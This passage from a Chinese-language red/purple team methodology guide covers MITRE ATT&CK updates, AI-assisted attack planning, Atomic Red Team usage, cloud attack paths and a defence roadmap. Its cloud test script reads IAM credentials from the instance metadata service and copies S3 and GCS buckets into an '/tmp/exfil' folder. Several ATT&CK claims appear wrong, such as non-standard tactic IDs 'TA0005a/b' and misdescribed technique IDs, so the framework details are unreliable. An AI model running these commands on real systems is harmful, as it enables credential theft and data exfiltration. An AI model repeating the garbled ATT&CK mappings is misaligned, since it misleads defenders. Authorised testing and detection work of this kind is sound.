| Collection (TA0009) | T1005 本地收集, T1114 邮件收集, T1039 网络共享 | 文件访问审计, 邮件日志 |
| Exfiltration (TA0010) | T1041 C2 通道外泄, T1048 替代协议外泄 | DLP, NDR, 代理日志 |
| Command and Control (TA0011) | T1071 应用层协议, T1573 加密通道, T1095 非标准协议 | DNS 日志, 代理日志, NDR |

## 前置条件

- 已签署红队演练授权文件（SOW + ROE + 法律豁免）
- MITRE ATT&CK 框架知识（企业矩阵 v19+）
- 攻击工具链：Kali Linux / Atomic Red Team / Prelude / C2 框架
- SIEM 管理员权限（Splunk / Elastic / QRadar）用于紫队检测验证
- EDR 管理权限（CrowdStrike / SentinelOne / Defender）用于告警确认
- PowerShell 5.1+ 和 .NET Framework 4.5+（Atomic Red Team）
- 网络架构图和资产清单
- 高管发起人支持和组织内部沟通

---

## Part C：2025-2026 前沿补充

### C.1 MITRE ATT&CK v18/v19 更新对红队演练的影响

ATT&CK v19（2025-04）引入了重大结构性变更，直接影响红队演练的 TTP 映射和紫队检测验证。

```
ATT&CK v18 → v19 关键变更
├── Defense Evasion (TA0005) 拆分
│   ├── 新增 TA0005a: Stealth (隐蔽)
│   │   → 原Defense Evasion中与隐藏活动相关的技术
│   │   → T1027 混淆文件, T1070 日志清除, T1562 禁用工具 等
│   └── 新增 TA0005b: Defense Impairment (防御削弱)
│       → 原Defense Evasion中与主动破坏防御能力的技术
│       → T1562 禁用安全工具, T1578 修改云基础设施 等
│
├── 新增技术 (v18-v19)
│   ├── AI/ML 对抗技术扩展
│   │   → T1598.003 钓鱼信息收集-深度伪造
│   │   → AI辅助社会工程学攻击链
│   └── 云原生攻击技术扩展
│       → 新增多个云平台特定子技术
│
├── ICS 子技术扩展
│   └── 工控系统攻击子技术细化
│
└── 红队演练迁移要点
    ├── 更新 ATT&CK Navigator 层文件格式
    ├── 检测规则 TTP 标签需同步更新
    ├── 报告中 Defense Evasion 统计需拆分
    └── 使用 ATT&CK STIX 2.1 数据库自动迁移
```

```python
# ATT&CK v19 迁移检查脚本
# 检查现有检测规则中的TTP标签是否需要更新

ATTACK_V18_TO_V19_MAPPINGS = {
    # Defense Evasion 拆分为 Stealth + Defense Impairment
    "T1027": "Stealth (TA0005a)",
    "T1027.001": "Stealth (TA0005a)",
    "T1027.002": "Stealth (TA0005a)",
    "T1027.005": "Stealth (TA0005a)",
    "T1070.001": "Stealth (TA0005a)",  # 日志清除
    "T1070.004": "Stealth (TA0005a)",  # 文件删除
    "T1562.001": "Defense Impairment (TA0005b)",  # 禁用安全工具
    "T1562.002": "Defense Impairment (TA0005b)",  # 禁用Windows事件日志
    "T1562.004": "Defense Impairment (TA0005b)",  # 禁用系统防火墙
    "T1578": "Defense Impairment (TA0005b)",  # 修改云基础设施
}

def check_migration(sigma_rules_dir: str):
    import os, re
    findings = []
    for root, dirs, files in os.walk(sigma_rules_dir):
        for f in files:
            if f.endswith('.yml') or f.endswith('.yaml'):
                path = os.path.join(root, f)
                content = open(path).read()
                for old_ttp, new_cat in ATTACK_V18_TO_V19_MAPPINGS.items():
                    if old_ttp.lower() in content.lower():
                        findings.append({
                            "file": path,
                            "ttp": old_ttp,
                            "new_category": new_cat,
                            "action": "更新标签和战术分类"
                        })
    return findings
```

### C.2 AI/LLM 辅助红队演练

AI 正在双向重塑红队演练：攻击侧的 AI 生成攻击、防御侧的 AI 辅助检测验证。

#### C.2.1 AI 辅助攻击仿真

```
AI/LLM 辅助攻击技术矩阵
├── 钓鱼生成
│   ├── LLM 生成高度个性化钓鱼邮件 (绕过传统检测)
│   ├── 深度伪造语音/视频用于社会工程学
│   └── 多语言/多文化自适应钓鱼模板
│
├── TTP 自动化
│   ├── LLM 生成攻击脚本 (PowerShell/Python/Shellcode)
│   ├── 基于目标环境自动规划攻击路径
│   └── 自动化 LOLBin 组合发现
│
├── 防御规避
│   ├── AI 生成无签名恶意代码
│   ├── 自动化 AMSI/ETW 绕过方案
│   └── 睡眠混淆/Syscall 间接调用自动生成
│
└── 侦察增强
    ├── LLM 分析 OSINT 数据自动画像
    ├── 代码审计自动化漏洞发现
    └── 目标组织安全态势自动评估
```

```python
# ai_red_team_assistant.py — AI辅助红队演练规划
# 使用LLM分析ATT&CK TTP并生成攻击路径建议

import json

def generate_attack_path(target_profile: dict, llm_client) -> dict:
    """
    基于目标环境画像和威胁情报，使用LLM生成攻击路径建议
    """
    prompt = f"""
    你是红队演练规划专家。基于以下目标环境信息，推荐3条攻击路径，
    每条路径映射到MITRE ATT&CK v19 TTP。

    目标环境:
    - 行业: {target_profile.get('industry', '未知')}
    - 主要平台: {target_profile.get('platforms', [])}
    - 已有安全控制: {target_profile.get('controls', [])}
    - 模拟威胁: {target_profile.get('threat_actor', '未知')}
    - 约束: {target_profile.get('constraints', [])}

    对每条路径提供:
    1. 攻击路径名称和描述
    2. 完整ATT&CK TTP链（从Initial Access到Exfiltration）
    3. 预估检测难度和所需权限
    4. 推荐的Atomic Red Team测试编号
    5. 关键OPSEC注意事项
    """
    response = llm_client.generate(prompt)
    return json.loads(response)
```

#### C.2.2 AI 辅助紫队检测验证

```
AI辅助检测验证工具生态 (2025-2026)
├── 检测规则生成
│   ├── LLM 从 TTP 描述自动生成 Sigma 规则
│   ├── 自然语言→Splunk SPL/Elastic EQL 自动转换
│   └── 规则质量自动评估和误报率预测
│
├── 告警分诊自动化
│   ├── Microsoft Security Copilot (GA 2025)
│   ├── CrowdStrike AI Agent Detection (自主分诊 98%)
│   ├── Elastic AI SOC Engine (EASE)
│   └── Splunk AI-assisted Investigation
│
├── 检测覆盖率分析
│   ├── 自动对比 ATT&CK 热图与检测规则
│   ├── AI 标识检测缺口并建议优先级
│   └── 持续监控检测覆盖率变化
│
└── 紫队报告自动化
    ├── AI 生成紫队演练报告
    ├── 自动标识关键发现和修复建议
    └── 生成 ATT&CK Navigator 覆盖率层文件
```

### C.3 紫队自动化平台更新 (2025-2026)

```
紫队自动化平台对比矩阵 v2.0
┌──────────────────┬──────────────────┬──────────────────┬──────────────────┐
│ 平台              │ 类型             │ 核心能力         │ 2025-2026更新    │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ Atomic Red Team  │ 开源测试库       │ 1737+测试用例    │ v2025 重构       │
│ (Red Canary)     │                  │ ATT&CK映射       │ Linux/Mac增强    │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ Prelude Operator │ 商业SaaS         │ 自动化TTP执行    │ 2025 GA          │
│ (Prelude)        │                  │ 持续检测验证     │ 云原生集成       │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ Vectr            │ 开源平台         │ 紫队流程管理     │ v0.7 检测热图    │
│ (Security Risk   │                  │ ATT&CK覆盖率     │ 报告增强         │
│ Advisors)        │                  │                  │                  │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ SnapAttack       │ 商业SaaS         │ 自动化攻击仿真   │ AI检测推荐       │
│ (NetSPI)         │                  │ 检测工程管线     │ SIEM集成         │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ CALDERA          │ 开源框架         │ 对手仿真         │ 维护模式         │
│ (MITRE)          │                  │ Agent化执行      │ 建议迁移Prelude  │
├──────────────────┼──────────────────┼──────────────────┼──────────────────┤
│ Purple Knight    │ 免费工具         │ AD安全评估       │ 2025 新增        │
│ (SpecterOps)     │                  │ ATT&CK映射       │ BloodHound联动   │
└──────────────────┴──────────────────┴──────────────────┴──────────────────┘
```

#### C.3.1 Atomic Red Team 2025 版更新

```bash
# Atomic Red Team 2025 版关键更新
# 1. 1737个测试用例（较2022版增长40%+）
# 2. 新增云原生攻击测试（AWS/Azure/GCP）
# 3. Linux/macOS 测试用例大幅扩展
# 4. 容器化执行支持（Docker/Podman）
# 5. CI/CD 集成增强

# 安装最新版 (2025)
Install-AtomicRedTeam -getAtomics -RepoOwner redcanaryco -Branch main

# 查看新增的云安全测试
Get-AtomicTechnique | Where-Object { $_.technique_name -like "*cloud*" -or $_.technique_name -like "*S3*" -or $_.technique_name -like "*Azure*" }

# 容器化执行 Atomic Test（隔离环境）
docker run --rm -v /path/to/atomics:/atomics atomicredteam/invoke-atomicredteam \
    Invoke-AtomicTest T1059.001 -TestNumbers 1 -PathToAtomicsFolder /atomics

# 查看所有新增测试（对比旧版本）
git log --oneline --since="2024-01-01" -- atomics/ | head -50
```

#### C.3.2 CALDERA 状态更新与替代方案

```
CALDERA 状态 (2025-2026)
├── 状态: 维护模式 (Maintenance Mode)
├── MITRE 官方推荐迁移路径: Prelude Operator
├── 最后功能更新: 2024-Q4
├── 安全补丁: 继续提供
│
├── 替代方案对比
│   ├── Prelude Operator (MITRE推荐)
│   │   ├── SaaS + 本地Agent
│   │   ├── 与ATT&CK同步更新
│   │   ├── 免费社区版 + 商业版
│   │   └── 命令: prelude-operator scan --ttp T1059.001
│   │
│   ├── Infection Monkey (GuardiCore/Broadcom)
│   │   ├── 自动化横向移动测试
│   │   ├── 零配置部署
│   │   └── 开源免费
│   │
│   └──自定义框架 (推荐高级红队)
│       ├── 结合 Atomic Red Team + 自定义编排
│       ├── Python/Go TTP Runner
│       └── 完全可控，无第三方依赖
│
└── 迁移建议
    ├── 短期: 继续使用CALDERA + 补丁
    ├── 中期: 评估Prelude Operator
    └── 长期: 建立自定义TTP编排框架
```

### C.4 云原生红队演练方法论

```
云环境红队演练 — 扩展攻击路径
├── AWS 攻击路径
│   ├── 初始访问: IAM User/API Key泄露/SSM参数窃取
│   ├── 权限提升: iam:PassRole + lambda:CreateFunction 链
│   ├── 横向移动: STS AssumeRole跨账户/EC2元数据服务
│   ├── 数据外泄: S3 Bucket枚举/RDS快照共享/CloudTrail禁用
│   └── 持久化: Lambda后门/IAM后门角色/CloudFormation恶意栈
│
├── Azure 攻击路径
│   ├── 初始访问: 条件访问绕过/Managed Identity滥用
│   ├── 权限提升: Entra ID角色提权/Key Vault访问
│   ├── 横向移动: Automation Account/Runbook执行
│   ├── 数据外泄: Blob Storage/ Cosmos DB查询
│   └── 持久化: Enterprise Application后门/Service Principal
│
└── GCP 攻击路径
    ├── 初始访问: Service Account密钥泄露/OAuth滥用
    ├── 权限提权: IAM Policy绑定/Cloud Functions提权
    ├── 横向移动: Workload Identity跨项目/BigQuery数据外泄
    ├── 数据外泄: GCS Bucket/GitHub镜像/Vertex AI模型窃取
    └── 持久化: Cloud Scheduler后门/Workflows恶意编排
```

```bash
# 云环境红队演练 TTP 快速测试脚本

# === AWS 测试 ===
# T1078.004 - 云账户有效账户
aws sts get-caller-identity  # 确认当前身份

# T1537 - 云存储数据外泄
aws s3 ls --profile compromised-user
aws s3 sync s3://target-bucket /tmp/exfil/

# T1552.005 - 云实例元数据
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# === Azure 测试 ===
# T1078.004 - Azure CLI 认证
az account show
az ad signed-in-user show

# T1530 - 云存储数据访问
az storage blob list --container-name sensitive-data --account-name targetstorage

# === GCP 测试 ===
# T1078.004 - GCP 认证验证
gcloud auth list
gcloud config configurations list

# T1530 - GCS 存储桶访问
gsutil ls gs://target-project-data/
gsutil cp -r gs://target-bucket/sensitive/ /tmp/exfil/
```

### C.5 红队工具生态更新 (2025-2026)

```
红队工具生态 2025-2026 更新
├── C2 框架
│   ├── Havoc (v0.8+) — 开源现代C2，2025年活跃更新
│   ├── Mythic (v3.x) — 插件化C2，支持多种Agent
│   ├── Sliver (v1.6+) — 异步C2，WireGuard支持
│   ├── Brute Ratel C4 — 商业高级C2
│   └── Cobalt Strike (v4.10+) — 行业标准持续更新
│
├── 对手仿真
│   ├── Atomic Red Team (2025版, 1737+测试)
│   ├── Prelude Operator (CALDERA替代)
│   ├── Infection Monkey (自动横向移动)
│   └── Purple Knight (AD安全评估)
│
├── 侦察/发现
│   ├── BloodHound CE v8 (OpenGraph架构, 2025.07)
│   ├── NetExec (取代CrackMapExec, 活跃维护)
│   ├── Ligolo-ng (多隧道代理)
│   └── Raven (AD侦察工具)
│
├── 后渗透
│   ├── Certipy (v5+, ADCS攻击)
│   ├── Impacket (持续更新)
│   ├── BadZure / EntraGoat (Azure攻击靶场)
│   └── MAAD-AF (Microsoft 365攻击框架)
│
└── 报告/管理
    ├── Vectr (紫队管理平台)
    ├── Attack Flow (MITRE攻击流程可视化)
    └── ATT&CK Navigator (v19层文件支持)
```

### C.6 紫队检测工程成熟度模型

```
紫队检测工程成熟度模型 (L0-L4)
├── L0: 无检测
│   ├── 无SIEM/EDR部署
│   └── 依赖人工日志检查
│
├── L1: 基础检测
│   ├── SIEM基础规则部署
│   ├── EDR默认策略启用
│   ├── 检测覆盖率 < 20%
│   └── 每年1次紫队演练
│
├── L2: 结构化检测
│   ├── Sigma规则标准化
│   ├── ATT&CK TTP映射完成
│   ├── 检测覆盖率 20-50%
│   ├── 季度紫队演练
│   └── 检测规则版本管理
│
├── L3: 持续验证
│   ├── 自动化检测管线
│   ├── Atomic Red Team CI/CD集成
│   ├── 检测覆盖率 50-80%
│   ├── 月度紫队演练
│   ├── 检测规则健康度监控
│   └── AI辅助误报分类
│
└── L4: 自主检测工程
    ├── AI驱动的检测工程
    ├── 检测覆盖率 > 80%
    ├── 持续自动化TTP验证
    ├── 实时检测覆盖率仪表盘
    ├── Agentic AI SOC集成
    └── 自适应检测规则调优
```

### C.7 中国红队/紫队社区精华参考 (2025-2026)

```
中文社区精华参考
├── FreeBuf网络安全行业门户
│   ├── "为何SOC团队需要引入紫队演练 | CSO Online深度解析"
│   ├── 红蓝对抗实战攻防方法论系列
│   └── Atomic Red Team中文指南
│
├── CSDN 技术社区
│   ├── "Atomic Red Team 2025版发布:1737个测试用例更新全解析"
│   ├── "红蓝对抗演练(Purple Teaming)的设计与执行:全面提升防御方的检测与响应" (2026-03)
│   ├── "Atomic Red Team紫队协作:攻防一体化测试流程" (2025-09)
│   └── ATT&CK实战系列——蓝队防御 (2025-11)
│
├── 安全客 (anquanke.com)
│   ├── ATT&CK框架实战应用系列
│   └── 红队演练案例复盘
│
├── 先知社区 (xz.aliyun.com)
│   ├── ATT&CK检测规则编写指南
│   └── 紫队演练实战记录
│
├── 奇安信
│   ├── 天眼新一代威胁感知系统
│   ├── 红队攻防实战指南
│   └── ATT&CK检测覆盖率评估报告
│
├── 腾讯云
│   ├── 紫队演练最佳实践
│   └── SOC检测工程方法论
│
└── 阿里云
    ├── 安全运营中心检测规则库
    └── 云原生紫队演练方案
```

### C.8 防御升级路线图 (P0-P3)

```
防御升级路线图 — 红队演练发现修复
├── P0 — 立即修复 (0-7天)
│   ├── 启用 LSA Protection (RunAsPPL)
│   ├── 部署 PowerShell ScriptBlock 日志 (4104)
│   ├── 启用高级审计策略 (4688 含命令行)
│   ├── 部署 Sysmon (v15.0+)
│   └── 紧急阻断红队发现的高危攻击路径
│
├── P1 — 30天内
│   ├── 部署计划任务审计 (4698)
│   ├── 配置 LSASS 进程保护规则
│   ├── 实施邮件安全网关增强规则
│   ├── 部署关键 Sigma 检测规则
│   ├── 启用 Credential Guard
│   └── 建立紫队演练基线热图
│
├── P2 — 90天内
│   ├── 部署网络分段限制横向移动
│   ├── 实施 Kerberos AES 加密强制
│   ├── 建立 SOC 检测规则持续验证流程
│   ├── 集成 Atomic Red Team 到 CI/CD
│   ├── 部署 JA4+ 网络指纹检测
│   └── 建立检测覆盖率月度仪表盘
│
└── P3 — 持续优化
    ├── AI 辅助检测工程落地
    ├── ATT&CK v19 完整覆盖
    ├── 紫队检测工程成熟度达到 L3+
    ├── 自动化检测管线
    ├── 云原生检测能力覆盖
    └── 年度红队演练常态化
```

### C.9 MITRE ATT&CK v19 扩展映射

| 战术 | 新增/变更技术 (v18→v19) | 红队演练重点 |
|------|------------------------|-------------|
| Reconnaissance (TA0043) | T1598.003 深度伪造信息收集 | AI钓鱼仿真 |
| Initial Access (TA0001) | T1566.003 钓鱼语音呼叫(新增) | 语音钓鱼测试 |
| Execution (TA0002) | T1059 Cloud Shell 执行扩展 | 云控制台攻击 |
| Persistence (TA0003) | T1098 Account Manipulation扩展 | 云账户后门 |
| **Stealth (TA0005a)** | 从Defense Evasion拆分 | 隐蔽性评估 |
| **Defense Impairment (TA0005b)** | 从Defense Evasion拆分 | 防御破坏测试 |
| Credential Access (TA0006) | T1110 MFA疲劳攻击扩展 | MFA绕过测试 |
| Lateral Movement (TA0008) | 云环境横向移动扩展 | 跨账户移动 |
| Collection (TA0009) | AI/ML数据收集扩展 | 模型窃取仿真 |
| Exfiltration (TA0010) | AI模型外泄扩展 | 知识产权保护测试 |
| Command and Control (TA0011) | AI辅助C2通道扩展 | 新型C2检测 |
